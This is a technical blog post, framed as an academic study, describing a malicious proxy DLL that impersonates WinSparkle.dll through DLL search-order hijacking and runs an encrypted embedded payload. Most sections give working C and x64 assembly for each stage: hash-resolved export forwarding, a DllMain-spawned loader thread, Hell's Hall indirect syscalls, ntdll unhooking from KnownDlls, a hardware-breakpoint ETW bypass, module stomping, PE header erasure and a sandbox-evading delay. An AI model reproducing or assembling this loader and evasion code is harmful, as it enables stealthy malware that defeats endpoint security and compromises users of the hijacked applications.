---
title: "Proxying & Loading — DLL Proxy with Indirect Syscalls, ETW Bypass & Module Stomping"
date: 2026-06-16
tags: ["maldev", "windows", "dll-hijacking", "indirect-syscalls", "edr-evasion", "educational", "c", "asm"]
summary: "An academic study on how a proxy DLL can impersonate a legitimate library while loading and executing an encrypted payload — without touching hooked Win32 APIs, without leaving RWX memory, and without writing a single byte to ntdll."
---

> **Academic Study.** This project was developed as a personal learning exercise to understand how modern loaders approach evasion at the DLL level. The goal was to study and implement each technique from first principles: understand why it exists, what detection vector it addresses, and how it actually works at the assembly level.
>
> Special thanks to **[MalDev Academy](https://maldevacademy.com/)** — the course material on Hell's Hall, indirect syscalls, and module stomping provided the conceptual foundation that made this study possible.
>
> Implementation details that go beyond educational value are intentionally omitted.

---

## What This Is

`dxfull32screen` is a DLL that **completely impersonates WinSparkle.dll** — a legitimate auto-update library used by applications like VLC. When placed in the same directory as the host application (DLL search order hijacking), Windows loads it instead of the real library.

Two things happen simultaneously:
1. Every WinSparkle function call from the host application is **transparently forwarded** to the real library — the application works normally and has no way to detect the substitution.
2. A background thread decrypts an AES-256 payload embedded inside the DLL's own resource section and executes it — using **no hooked Win32 API calls** at any point in the chain.

The study covers each layer of that execution chain in depth.

---

## Execution Flow

```
DllMain (DLL_PROCESS_ATTACH)
│
├── GetResourcePayload()        read encrypted payload from .rsrc (manual PE walk)
└── CreateThread → OnModuleLoad()
        │
        ├── IatCamouflage()              plant a benign API call in the IAT
        ├── AddWin32uToIat()             force-load win32u.dll (needed for syscall gadget)
        ├── InitIndirectSyscalls()       resolve SSNs from ntdll + borrow syscall inst from win32u
        ├── AddVectoredExceptionHandler  register VEH for the unhook step
        ├── NtDelayExecution (2.3 min)   indirect syscall delay — sandbox evasion
        ├── SyncModuleState()            restore ntdll .text from \KnownDlls\ (unhooking)
        ├── RemoveVectoredExceptionHandler
        ├── PatchEtw()                   resolve EtwEventWrite address
        ├── HbpApply()                   arm hardware breakpoint on EtwEventWrite
        ├── StompPeHeader()              zero own PE header in memory
        └── ProcessData()
                ├── FetchAesConfAndDecrypt()    AES-256 CBC decrypt payload
                ├── StompModule()               write beacon into loaded DLL's .text (image-backed)
                │    └── fallback: RW alloc → copy → RX (no RWX)
                └── RunModule() → NtCreateThreadEx (indirect syscall)
```

---

## Part 1 — The Proxy: How DLL Proxying Works

### The Concept

DLL proxying is the technique of replacing a legitimate DLL with one of your own that: (a) exposes the exact same exported functions so the host application keeps working, and (b) silently does something else on the side.

The vector that makes this possible is the **Windows DLL search order**. When an application calls `LoadLibrary("WinSparkle.dll")` without a full path, Windows searches several directories in sequence — and the application's own directory comes first. Drop a malicious `WinSparkle.dll` there, rename the original to `winsparkle_orig.dll`, and the next time the application starts it loads your DLL without any indication that anything changed.

For this to be invisible, the proxy must satisfy two constraints simultaneously:
- Every function the host application calls must work correctly — the proxy must forward the call to the real library.
- The loader logic must run at some point during the process lifetime, independently of which functions the host happens to call.

### The .def File

A DLL's export table is what tells Windows (and the application) which functions are available by name. The linker builds this table from a `.def` file. Getting it right matters: applications can load functions either by name (`GetProcAddress("win_sparkle_init")`) or by **ordinal** — a numeric index into the export table. If the ordinal numbers don't match the original DLL's, any ordinal-based call crashes.

The `.def` file for this proxy replicates the full WinSparkle export table with every function at its exact ordinal:

```
LIBRARY
EXPORTS
    win_sparkle_init                                @9
    win_sparkle_cleanup                             @4
    win_sparkle_check_update_with_ui                @1
    win_sparkle_set_appcast_url                     @12
    win_sparkle_set_app_details                     @11
    win_sparkle_set_error_callback                  @20
    win_sparkle_set_did_find_update_callback        @16
    ; ... all exports, all ordinals matching the original
```

The linker reads this and produces a PE export directory where each function is registered under both its name and its ordinal number. The host application resolves imports at load time by walking this directory — and finds exactly what it expected to find.

### From Concept to Exported Function: A Complete Example

Take `win_sparkle_init` — a `void(void)` function. Here is the full path from nothing to a working proxy export.

**Step 1 — Pre-compute the hash of the function name.**  
No string for `"win_sparkle_init"` will appear in the binary. Its SDBM hash is computed offline and stored as a constant:

```c
#define WS_win_sparkle_init   0x05E9D682
```

**Step 2 — The original DLL name as a char array.**  
The name `winsparkle_orig.dll` is not a string literal. It lives as a character array, initialized element by element, so it never appears as a null-terminated string in `.rodata`:

```c
CHAR szOrigDll[] = {
    'w','i','n','s','p','a','r','k','l','e','_','o','r','i','g','.','d','l','l','\0'
};
```

**Step 3 — The macro generates the export.**  
`FWD_VOID` takes the function name and its hash, and expands to a fully `__declspec(dllexport)` function. At call time it resolves `LoadLibraryA` by hash, loads the original DLL, resolves the real function by hash, and calls it:

```c
#define FWD_VOID(name, hash)                                                    \
    __declspec(dllexport) void name() {                                         \
        fnLoadLibraryA pLLA = (fnLoadLibraryA)                                  \
            GetProcAddressH(GetModuleHandleH(kernel32dll), LoadLibraryASDBM);   \
        if (!pLLA) return;                                                       \
        HMODULE h = pLLA(szOrigDll);          /* load winsparkle_orig.dll */    \
        if (!h) return;                                                          \
        void (*fn)() = (void(*)())GetProcAddressH(h, hash); /* resolve by hash */\
        if (fn) fn();                         /* forward the call */            \
    }

FWD_VOID(win_sparkle_init, WS_win_sparkle_init)
```

**Step 4 — The .def entry ties the name to the ordinal.**  
The linker sees `win_sparkle_init` declared with `__declspec(dllexport)` and the `.def` entry `win_sparkle_init @9`. The resulting PE export directory registers the function under both the name and ordinal 9 — matching the original library exactly.

The full chain for a single export, in summary:

```
offline: compute SDBM("win_sparkle_init") ^ 0xCAFEBABE = 0x05E9D682

compile: FWD_VOID(win_sparkle_init, 0x05E9D682)
         → __declspec(dllexport) void win_sparkle_init() { ... }

link:    dxfull32screen.def → win_sparkle_init @9
         → PE export directory: name="win_sparkle_init", ordinal=9, RVA=<stub>

runtime: host calls win_sparkle_init()
         → stub resolves LoadLibraryA by hash → loads winsparkle_orig.dll
         → resolves real win_sparkle_init by hash → forwards call
```

No string `"win_sparkle_init"` or `"winsparkle_orig.dll"` exists anywhere in the binary. The host application's call goes through, the real library responds, and the host never knows.

The seven macro variants (`FWD_VOID`, `FWD_STR`, `FWD_STR2`, `FWD_INT`, `FWD_INT_RET`, `FWD_SHORT`, `FWD_CB`) cover every distinct function signature in the WinSparkle API. Each generates a properly-typed exported stub that takes the right arguments, passes them through to the real function, and returns any return value correctly.

### Where to Trigger the Loader: DllMain vs. an Exported Function

This was actually an open question during development — two approaches were tested.

**Option A: trigger from an exported function.**  
Run the loader code inside one of the proxy stubs — for example, inside `win_sparkle_init`, before forwarding the call. The idea is that `win_sparkle_init` is almost always the first WinSparkle function an application calls, so it would fire early and reliably. The downside: it only fires if the application actually calls that specific function. An application that loads WinSparkle but calls a different first function, or that resolves all its imports ahead of time and calls them in a different order, would never trigger the loader. Timing also becomes tricky — the loader thread needs time, and the proxy must still return promptly so the application doesn't stall.

**Option B: trigger from DllMain (this version).**  
`DllMain` with `DLL_PROCESS_ATTACH` fires the moment Windows loads the DLL — before any exported function is ever called, regardless of which function the host will call first. The loader is guaranteed to start as soon as the library is loaded.

The constraint is that `DllMain` runs under the **loader lock**: a global mutex that Windows holds during DLL load/unload operations. You cannot call most Win32 APIs from inside `DllMain` without risking a deadlock. The solution is to do the absolute minimum in `DllMain` — read the resource payload and spawn a thread — then return `TRUE` immediately so Windows releases the loader lock and the host process continues normally. All the actual loader logic runs in the thread, which executes outside the loader lock:

```c
BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    switch (dwReason) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        g_hSelf = hModule;
        // Only do what's safe under the loader lock:
        if (!GetResourcePayload(hModule, IDR_RCDATA1, &g_pConfig, &g_moduleSize))
            return FALSE;
        // Spawn the loader thread and return immediately
        { HANDLE hT = CreateThread(NULL, 0, OnModuleLoad, NULL, 0, NULL);
          if (hT) CloseHandle(hT); }
        break;
    }
    return TRUE;
}
```

`GetResourcePayload` is safe here because it only reads memory that is already mapped — no API calls that could deadlock. Everything else is deferred to the thread. `DisableThreadLibraryCalls` suppresses `DLL_THREAD_ATTACH`/`DLL_THREAD_DETACH` notifications, which would otherwise fire for every thread the host creates and add unnecessary load-lock contention.

---

## Part 2 — API Hashing: No Strings, No IAT Entries

Every Win32 and NT function in this project is resolved at runtime by its **SDBM hash**, XOR'd with a compile-time key (`0xCAFEBABE`). The SDBM algorithm is case-insensitive, making it robust to DLL name casing variations:

```c
UINT32 SDBMHashCI(LPCSTR cString) {
    UINT32 uHash = 0;
    while (*cString) {
        CHAR c = (*cString >= 'A' && *cString <= 'Z') ? *cString + 32 : *cString;
        uHash = (UINT32)c + (uHash << 6) + (uHash << 16) - uHash;
        cString++;
    }
    return uHash;
}
// All hashes are XOR'd: SDBMHASH(str) = SDBMHashCI(str) ^ 0xCAFEBABE
```

`GetModuleHandleH` replaces `GetModuleHandle`: it reads the PEB directly from the GS segment register (`__readgsqword(0x60)`), walks the `InMemoryOrderModuleList` linked list, converts each DLL's wide name to lowercase, hashes it, and compares against the requested hash — no Win32 API call involved.

`GetProcAddressH` replaces `GetProcAddress`: it walks the PE export directory of the target module manually, hashing each exported function name and comparing. It also handles **forwarded exports** (where one DLL's export is actually implemented in another DLL) by parsing the forwarder string and recursively resolving through the chain.

The result: no API name appears as a string anywhere in the binary, and neither `GetModuleHandle` nor `GetProcAddress` appear in the Import Address Table.

---

## Part 3 — Indirect Syscalls: Hell's Hall

### The Problem with Calling ntdll Directly

EDRs hook user-mode APIs by patching the first bytes of NT functions in ntdll. A typical hooked stub looks like this:

```
NtAllocateVirtualMemory:
    E9 XX XX XX XX    JMP <edr_hook_handler>   ← EDR replaced the real prologue
    ...
```

When your code calls `NtAllocateVirtualMemory`, control goes to the EDR's hook handler first, which inspects the call, logs telemetry, and (if it decides to allow) jumps to the real function. Direct syscalls bypass this but create a different problem: the call stack shows the `syscall` instruction executing from an unrecognized memory region — a red flag.

**Indirect syscalls** solve both problems: call the kernel directly (bypassing the hook), but do so from a legitimate DLL's `.text` section (clean call stack origin).

### Step 1: Finding the SSN

Every NT function has a **System Service Number (SSN)** — a numeric index into the kernel's SSDT (System Service Descriptor Table). The kernel dispatches the call based on the SSN in `EAX`. Clean ntdll stubs look like:

```
4C 8B D1        mov r10, rcx        ; copy first argument
B8 XX XX 00 00  mov eax, SSN        ; load SSN — bytes 4 and 5
0F 05           syscall
C3              ret
```

`FetchNtSyscall` locates the target function by SDBM hash, then reads the SSN directly from bytes 4–5 of the stub:

```c
if (*((PBYTE)pFuncAddress    ) == 0x4C   // mov r10
 && *((PBYTE)pFuncAddress + 1) == 0x8B
 && *((PBYTE)pFuncAddress + 2) == 0xD1
 && *((PBYTE)pFuncAddress + 3) == 0xB8   // mov eax
 && *((PBYTE)pFuncAddress + 6) == 0x00   // high byte of SSN is 0 (< 0x100)
 && *((PBYTE)pFuncAddress + 7) == 0x00) {
    BYTE high = *((PBYTE)pFuncAddress + 5);
    BYTE low  = *((PBYTE)pFuncAddress + 4);
    pNtSys->dwSSn = (high << 8) | low;
}
```

If the function is hooked (starts with `JMP`), the SSN cannot be read directly. Hell's Hall handles this by scanning **neighboring stubs** in both directions (functions are stored contiguously, 0x20 bytes apart in the export table). The SSN of neighboring functions is predictable because NT functions are numbered sequentially in alphabetical order. If the target stub is hooked but its neighbor at offset `+idx` is clean and has SSN `N`, then the target's SSN is `N - idx`:

```c
if (*((PBYTE)pFuncAddress) == 0xE9 /*JMP*/) {
    for (WORD idx = 1; idx <= SEARCH_RANGE; idx++) {
        // look DOWN: neighbors with higher SSNs
        if (stub_at[func + idx * 0x20] looks like clean mov r10/mov eax) {
            pNtSys->dwSSn = (high << 8) | low - idx;
            break;
        }
        // look UP: neighbors with lower SSNs
        if (stub_at[func - idx * 0x20] looks like clean mov r10/mov eax) {
            pNtSys->dwSSn = (high << 8) | low + idx;
            break;
        }
    }
}
```

This also handles the case where the hook patches only the `mov eax` at offset +3 (some EDRs patch there instead of the very first byte).

### Step 2: Borrowing a syscall Instruction from win32u.dll

`win32u.dll` is a Windows DLL that contains NT function stubs for the Win32k subsystem (GDI, user input). Its stubs contain real `syscall ; ret` sequences. `FetchWin32uSyscallInst` scans win32u's exports looking for those sequences:

```c
// The opcode 0x050F (syscall) is stored obfuscated in .data as 0x0561,
// XOR'd back to 0x050F at runtime — the raw bytes never appear in the binary.
volatile unsigned short g_SYSCALL_OPCODE = 0x0561;  // 0x0561 ^ 0x6E = 0x050F

for (DWORD i = 0; i < g_Win32uConf.dwNumberOfNames; i++) {
    for (DWORD ii = 0; ii < SYSCALL_STUB_SIZE; ii++) {
        if (*(unsigned short*)((ULONG_PTR)pFuncAddress + ii) == (g_SYSCALL_OPCODE ^ 0x6E)
         && *(BYTE*)((ULONG_PTR)pFuncAddress + ii + 2) == 0xC3 /*ret*/) {
            if (iCounter == iSeed) {          // pick one at random (seed % 16)
                *ppSyscallInstAddress = (PVOID)((ULONG_PTR)pFuncAddress + ii);
                return TRUE;
            }
            iCounter++;
        }
    }
}
```

The random selection (`iSeed % 16`) means the borrowed address varies across runs — the call stack return address into win32u is different each time, defeating signatures that watch for specific win32u offsets.

Even the `syscall` opcode itself (`0x050F`) is stored XOR'd (`0x0561`) to avoid the raw bytes appearing in the `.data` section.

### Step 3: Executing the Syscall (Assembly)

`HellsHall.asm` implements the two bridge functions that the C code calls through:

```asm
.data
    wSystemCall         DWORD 0h   ; SSN goes here
    qSyscallInsAdress   QWORD 0h   ; address of syscall gadget in win32u

.code

SetSSn proc
    xor eax, eax
    mov wSystemCall, eax           ; clear SSN slot
    mov qSyscallInsAdress, rax     ; clear address slot
    mov eax, ecx                   ; ecx = SSN (first argument)
    mov wSystemCall, eax           ; store SSN
    mov r8, rdx                    ; rdx = address of syscall gadget in win32u
    mov qSyscallInsAdress, r8      ; store gadget address
    ret
SetSSn endp

RunSyscall proc
    xor r10, r10
    mov rax, rcx
    mov r10, rax                   ; r10 = rcx (NT calling convention requires this)
    mov eax, wSystemCall           ; load SSN into eax
    jmp Run
    xor eax, eax    ; dead code — padding
    xor rcx, rcx    ; dead code — looks like a normal stub
    shl r10, 2      ; dead code
Run:
    jmp qword ptr [qSyscallInsAdress]   ; jump into win32u's syscall;ret
RunSyscall endp
```

The usage pattern in C is:

```c
SET_SYSCALL(g_CfgData.NtAllocateVirtualMemory);   // calls SetSSn(ssn, gadget_address)
RunSyscall(NtCurrentProcess(), &pAddress, 0, &sAllocSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
```

The CPU transitions to kernel mode from inside `win32u.dll`'s `.text`. The kernel sees a system call originating from a Microsoft-signed DLL.

---

## Part 4 — EDR Unhooking: Restoring ntdll from \KnownDlls\

### Why Hooks Survive Hell's Hall

Indirect syscalls bypass hooks on individual NT functions. But ntdll also contains higher-level functions that operate in user mode (heap management, string routines, loader code) — and some EDR behaviour analysis happens by inspecting the call sequence and memory context, not just by hooking syscall stubs. Restoring the entire `.text` section is a cleaner baseline.

### \KnownDlls\ — The Clean Copy

Windows maintains a set of pre-mapped, read-only section objects at `\KnownDlls\ntdll.dll`, `\KnownDlls\kernel32.dll`, etc. These are mapped once at boot from the original files on disk — before any EDR driver runs — and shared across all processes. Critically, **no user-mode code can write to them**: they are mapped read-only and backed by the original on-disk image.

`SyncModuleState` maps the clean copy and overwrites the hooked in-memory `.text` section:

```c
// Build the path \KnownDlls\<dllname> as a WCHAR array (no string literal)
WCHAR wFullDllPath[MAX_PATH] = { L'\\',L'K',L'n',L'o',L'w',L'n',L'D',L'l',L'l',L's',L'\\' };
Wcscat(wFullDllPath, szDllName);

// Open the section object — NtOpenSection via indirect syscall
SET_SYSCALL(g_CfgData.NtOpenSection);
RunSyscall(&hSection, SECTION_MAP_READ | SECTION_MAP_EXECUTE, &ObjectiveAttr);

// Map it into this process — NtMapViewOfSection via indirect syscall
SET_SYSCALL(g_CfgData.NtMapViewOfSection);
RunSyscall(hSection, NtCurrentProcess(), &pModule, NULL, NULL, NULL,
           &sViewSize, ViewUnmap, NULL, PAGE_READONLY);
```

Once the clean copy is mapped, the function locates the `.text` section of the in-memory (hooked) copy by comparing section name hashes (`text_SDBM`), makes it temporarily writable, and copies:

```c
// RX → RWX briefly during the copy — restored immediately after
SET_SYSCALL(g_CfgData.NtProtectVirtualMemory);
RunSyscall(NtCurrentProcess(), &pLocalTxtSectionAddress, &sTextSectionSize,
           PAGE_EXECUTE_READWRITE, &dwOldProtection);

Memcpy(pLocalTxtSectionAddress, pKnownDllTxtSectionAddress, sTextSectionSize);

SET_SYSCALL(g_CfgData.NtProtectVirtualMemory);
RunSyscall(NtCurrentProcess(), &pLocalTxtSectionAddress, &sTextSectionSize,
           dwOldProtection, &dwOldProtection);   // restore original protection
```

After this step, ntdll's `.text` in the current process matches the on-disk image — all EDR hooks are gone.

### The VEH Safety Net

Copy-on-write semantics can cause an access violation during the write. A VEH (Vectored Exception Handler) is registered before `SyncModuleState` runs. If a write triggers `EXCEPTION_ACCESS_VIOLATION` within the target address range, the handler retries the protection change and copy:

```c
LONG WINAPI VectoredExceptionHandler(PEXCEPTION_POINTERS pExceptionInfo) {
    if (pExceptionInfo->ExceptionRecord->ExceptionCode != EXCEPTION_ACCESS_VIOLATION)
        return EXCEPTION_CONTINUE_SEARCH;

    if (pExceptionInfo->ExceptionRecord->ExceptionAddress < g_pLocalTxtSectionAddress ||
        pExceptionInfo->ExceptionRecord->ExceptionAddress >
            (PVOID)((ULONG_PTR)g_pLocalTxtSectionAddress + g_sTextSectionSize))
        return EXCEPTION_CONTINUE_SEARCH;

    // make it writable, copy the clean section, restore
    SET_SYSCALL(g_CfgData.NtProtectVirtualMemory);
    RunSyscall(NtCurrentProcess(), &pTmpAddr, &sTmpSize, PAGE_EXECUTE_READWRITE, &dwOldProtection);
    Memcpy(g_pLocalTxtSectionAddress, g_pKnownDllTxtSectionAddress, g_sTextSectionSize);
    SET_SYSCALL(g_CfgData.NtProtectVirtualMemory);
    RunSyscall(NtCurrentProcess(), &pTmpAddr, &sTmpSize, PAGE_EXECUTE_READ, &dwOldProtection);

    return EXCEPTION_CONTINUE_EXECUTION;
}
```

The VEH is removed immediately after `SyncModuleState` returns.

---

## Part 5 — ETW Bypass: Hardware Breakpoints, Zero Memory Writes

### What ETW Does and Why It Matters

ETW (Event Tracing for Windows) is the primary telemetry channel for many EDRs. `EtwEventWrite` in ntdll is called by the runtime when security-relevant events occur — process creation, memory allocation patterns, module loads. EDRs subscribe to ETW providers and receive these events in real time.

The standard bypass is to patch `EtwEventWrite` in memory (write a `ret` or `xor eax,eax; ret` at the start of the function). This works but is trivially detected: memory integrity checks scan ntdll's `.text` section for modifications.

### The Hardware Breakpoint Approach

x86-64 CPUs have **hardware debug registers**: `Dr0`–`Dr3` hold breakpoint addresses, `Dr7` controls which breakpoints are active and in what mode (execute, read, write). When execution reaches an address set in `DrN` and `Dr7` has the corresponding enable bit set, the CPU fires a `#DB` (debug exception, `STATUS_SINGLE_STEP`) before executing that instruction.

The approach: set a hardware execute breakpoint on `EtwEventWrite`. When any thread hits that address, the `#DB` exception fires. A VEH intercepts it, fakes a successful return, and jumps back to the caller — `EtwEventWrite` never executes.

`PatchEtw` just resolves the target address:

```c
BOOL PatchEtw() {
    g_pEtwTarget = GetProcAddressH(GetModuleHandleH(ntdlldll), EtwEventWriteSDBM);
    return (g_pEtwTarget != NULL);
}
```

`HbpApply` arms the breakpoint. Note that `GetThreadContext` and `SetThreadContext` are themselves resolved by SDBM hash — their names never appear as strings:

```c
BOOL HbpApply() {
    CHAR szGetTC[] = { 'G','e','t','T','h','r','e','a','d','C','o','n','t','e','x','t','\0' };
    CHAR szSetTC[] = { 'S','e','t','T','h','r','e','a','d','C','o','n','t','e','x','t','\0' };

    fnGetThCtx pGetCtx = (fnGetThCtx)GetProcAddressH(hK32, SDBMHASH(szGetTC));
    fnSetThCtx pSetCtx = (fnSetThCtx)GetProcAddressH(hK32, SDBMHASH(szSetTC));
    fnAddVectoredExceptionHandler pAddVEH = ...;

    // Register VEH first
    g_pHbpVeh = pAddVEH(1, HbpVehHandler);

    // Read current thread context, arm Dr0 on EtwEventWrite, enable it in Dr7
    CONTEXT ctx = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
    pGetCtx((HANDLE)(LONG_PTR)-2, &ctx);   // -2 = current thread pseudo-handle

    ctx.Dr7 = 0;
    ctx.Dr0 = (ULONG_PTR)g_pEtwTarget;
    ctx.Dr7 |= 0x1;    // enable Dr0 as execute breakpoint (local enable bit 0)

    pSetCtx((HANDLE)(LONG_PTR)-2, &ctx);
}
```

The VEH handler intercepts the `STATUS_SINGLE_STEP` exception. It checks that `RIP` is exactly `EtwEventWrite`'s address, then surgically replaces the execution with a fake successful return:

```c
static LONG WINAPI HbpVehHandler(PEXCEPTION_POINTERS pEx) {

    if (pEx->ExceptionRecord->ExceptionCode != STATUS_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    PCONTEXT ctx = pEx->ContextRecord;

    if (g_pEtwTarget && ctx->Rip == (ULONG_PTR)g_pEtwTarget) {
        ctx->Rax = 0;                          // fake return value: STATUS_SUCCESS
        ctx->Rip = *(ULONG_PTR*)ctx->Rsp;     // read return address from stack top
        ctx->Rsp += sizeof(ULONG_PTR);         // pop the return address (clean up stack)
        return EXCEPTION_CONTINUE_EXECUTION;   // resume — caller sees ETW returned normally
    }

    return EXCEPTION_CONTINUE_SEARCH;
}
```

What happens when the caller of `EtwEventWrite` returns: execution resumes at whatever address was on the stack when `EtwEventWrite` was entered — the real caller. The entire ETW event is silently discarded. **Zero bytes written to ntdll.** Memory integrity checks find nothing.

---

## Part 6 — Avoiding RWX: The Memory Permission Strategy

RWX (`PAGE_EXECUTE_READWRITE`) memory is one of the strongest heuristic signals an EDR can act on: legitimate code almost never lives in memory that is simultaneously writable and executable. The goal was to **never leave any region in a persistent RWX state**.

### Fallback Allocation: RW → copy → RX

When module stomping fails, the decrypted payload needs private memory:

```c
// Step 1: allocate as read-write only — not executable
SET_SYSCALL(g_CfgData.NtAllocateVirtualMemory);
RunSyscall(NtCurrentProcess(), &pAddress, 0, &sAllocSize,
           MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

// Step 2: copy payload in
Memcpy(pAddress, pDecryptedPayload, sPayloadSize);

// Step 3: zero the decrypted source buffer before freeing
Memset(pDecryptedPayload, 0, sPayloadSize);
HeapFree(GetProcessHeap(), 0, pDecryptedPayload);

// Step 4: transition to read-execute — never RWX
SET_SYSCALL(g_CfgData.NtProtectVirtualMemory);
RunSyscall(NtCurrentProcess(), &pAddress, &sAllocSize, PAGE_EXECUTE_READ, &dwOld);
```

The region is RW during the write, then RX after. At no point is it both writable and executable.

### Primary Path: Module Stomping (No New Private Allocation)

The preferred path avoids the private allocation entirely. The payload is written into the `.text` section of a DLL already loaded in the process. The memory region was already RX (it's a legitimate DLL's executable code), becomes briefly RWX during the write, then returns to RX:

```c
// The section is already RX — change to RWX only for the duration of the copy
SET_SYSCALL(g_CfgData.NtProtectVirtualMemory);
RunSyscall(NtCurrentProcess(), &pProt, &size, PAGE_EXECUTE_READWRITE, &dwOld);

Memcpy(pTarget, pPayload, sPayloadSize);      // write payload into DLL's .text

// Immediately restore original protection (RX)
pProt = pTarget; size = sPayloadSize;
SET_SYSCALL(g_CfgData.NtProtectVirtualMemory);
RunSyscall(NtCurrentProcess(), &pProt, &size, dwOld, &dwOld);
```

The RWX window exists only for the duration of `Memcpy` — microseconds. After that, the region is back to RX and indistinguishable from normal DLL code. The memory type reported by `VirtualQuery` is **MEM_IMAGE** (image-backed), not MEM_PRIVATE — tools checking for anonymous private RX regions see nothing suspicious.

The selection of which DLL to stomp iterates the loaded module list in **reverse** (from the end of the `InLoadOrderModuleList`), targeting recently-loaded DLLs like plugins and codecs. System DLLs (`ntdll`, `kernel32`, `kernelbase`, `win32u`) are explicitly excluded, as are CRT DLLs and the proxy DLL itself.

### The Same Pattern in SyncModuleState

The unhooking step applies the same discipline: the protection change during the `.text` copy is transient, and the original protection (`dwOldProtection`) is restored immediately after:

```c
SET_SYSCALL(g_CfgData.NtProtectVirtualMemory);
RunSyscall(..., PAGE_EXECUTE_READWRITE, &dwOldProtection);

Memcpy(pLocalTxtSectionAddress, pKnownDllTxtSectionAddress, sTextSectionSize);

SET_SYSCALL(g_CfgData.NtProtectVirtualMemory);
RunSyscall(..., dwOldProtection, &dwOldProtection);  // restore, not hardcode RX
```

The original protection is preserved and restored exactly, rather than hardcoded — important because some ntdll sections may have non-standard protections that would break if overwritten with a fixed value.

---

## Additional Hardening Details

**PE header stomping.** After the loader finishes setup, it zeros the first 0x1000 bytes of its own image base — erasing the DOS header, PE signature, NT headers, and section table. Memory scanners looking for PE signatures in the loaded module list won't find one for this DLL.

**IAT camouflage.** `IatCamouflage` calls `GetSystemTimeAsFileTime` — a completely benign API — forcing it into the Import Address Table. An IAT that contains only suspicious low-level functions is itself a signal. One innocent call blends the import profile.

**String obfuscation.** Every string in the binary — DLL names, function names, path components — is stored as a `CHAR[]` or `WCHAR[]` character array initialized element by element, not as a string literal. String literals land in `.rodata` and are trivially extracted by `strings`. Character arrays are stack-local or embedded in data with no aggregated null-terminated form in the section.

**Delay execution.** `NtDelayExecution` is called via indirect syscall with a ~2.3-minute delay before any payload activity. Automated sandbox analysis typically has a timeout of 60–90 seconds. The call uses `LARGE_INTEGER` negative values (relative time) via the NT interface, not `Sleep` — which is hooked in most EDR implementations and is itself a behavioral signal.

---

## Component Summary

| File | Role |
|------|------|
| `dllmain.c` | DLL entry point, WinSparkle proxy exports (32 functions, hash-resolved), loader thread |
| `dxfull32screen.def` | Export table — exact ordinal match to real WinSparkle ABI |
| `winsparkle.def` | Original ABI reference (31 exports) |
| `RsrcPayload.c` | Manual PE resource directory walk — no FindResource/LoadResource |
| `Aes.c` / `Aes.h` | Self-contained AES-256 CBC — no CryptoAPI, key+IV appended to blob |
| `ApiHashing.c` | PEB walk for module handle, export dir walk for proc address, SDBM hash |
| `HellsH.c` | Hell's Hall SSN resolution (clean stub + neighbor scan), win32u gadget selection |
| `HellsHall.asm` | x64 assembly: SetSSn + RunSyscall bridge |
| `Unhook.c` | KnownDlls unhook, ETW/AMSI HBP bypass, PE header stomp, VEH for SyncModuleState |
| `Inject.c` | AES decrypt, module stomping, RW→RX fallback, NtCreateThreadEx execution |
| `Common.h` | All SDBM hash constants, NT_SYSCALL structs, SET_SYSCALL macro |
| `Structs.h` | PEB, TEB, LDR structures, OBJECT_ATTRIBUTES — no Windows headers needed |
| `typedef.h` | Function pointer typedefs for every resolved API |
| `IatCamo.h` | GetSystemTimeAsFileTime call — benign IAT entry |

---

> *Academic study. Thanks to [MalDev Academy](https://maldevacademy.com/) for the foundational material on indirect syscalls, Hell's Hall, and module stomping.*
